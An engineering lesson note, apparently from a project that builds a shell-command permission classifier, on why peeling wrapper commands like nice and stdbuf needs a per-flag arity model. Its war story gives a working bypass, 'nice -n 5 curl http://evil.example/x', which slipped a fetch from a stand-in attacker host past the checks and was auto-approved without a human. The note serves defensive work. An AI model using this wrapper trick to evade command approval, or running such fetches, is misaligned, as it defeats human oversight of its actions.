---
slug: wrapper-peel-needs-arity-model
hook: "Peeling a command wrapper (`nice`, `timeout`, `stdbuf`) by blindly dropping flag-shaped words mistakes a separate option VALUE for argv[0] — relabeling the command and defeating every name-keyed check; model each wrapper's flag arity or fail closed."
topics: [security, shell, parsing, permissions]
changes: [70]
created: 2026-08-20
updated: 2026-08-20
promotion_state: candidate
promoted_to:
---

## Apply

When a classifier peels wrapper commands to evaluate the inner command, "skip leading `-` words"
is never a safe peel: GNU wrappers accept option values as **separate words** (`nice -n 5`,
`stdbuf -o 0`, `timeout -s 30`), so the blind skip drops the flag, leaves its value in command
position, and produces a segment named `5` or `0`. Every name-keyed check downstream — egress
lists, catastrophic-command detection, safelists — silently stops matching, and the real command
rides through as an "argument." Give each peeled wrapper an explicit arity model (which flags
consume a following word, which are attached-only) and **fail closed on any unmodelled flag**; a
wrapper you can't model precisely belongs in the fail-closed set, not the peel table. Watch for
flags that name files the wrapped tool *writes* (`/usr/bin/time -o FILE`) — those are a write
channel no redirect capture sees, and are a reason to refuse rather than model. Pin the
separate-value forms and the unmodelled-flag forms as corpus rows; a prose claim that "every option
is valueless or attached" is exactly the kind of assertion to test, not trust.

Related: [[shell-parse-inspect-every-ast-channel]], [[containment-proof-needs-a-real-resolved-path]].

## War story

- 2026-08-19 (#70, PR #76) — D2 added `timeout` peeling with a correct arity model but left the
  pre-existing `nice`/`stdbuf` peel dropping leading `-` words blindly, while newly asserting in a
  doc comment that their options are "either valueless or attached." False for GNU `nice -n 5` and
  `stdbuf -o 0`: `nice -n 5 curl http://evil.example/x` peeled to a segment named `5` with `curl`
  as an argument — `egressNames["5"]` missed, `pathArgs` proved the words in-workspace, and the
  fetch auto-approved with no human. Fixed with per-wrapper `wrapperSpec` arity models
  (fail-closed default); the same modelling pass found `nohup` takes no options at all and that
  `/usr/bin/time -o FILE` names an unseen write target, so both were refused rather than widened.
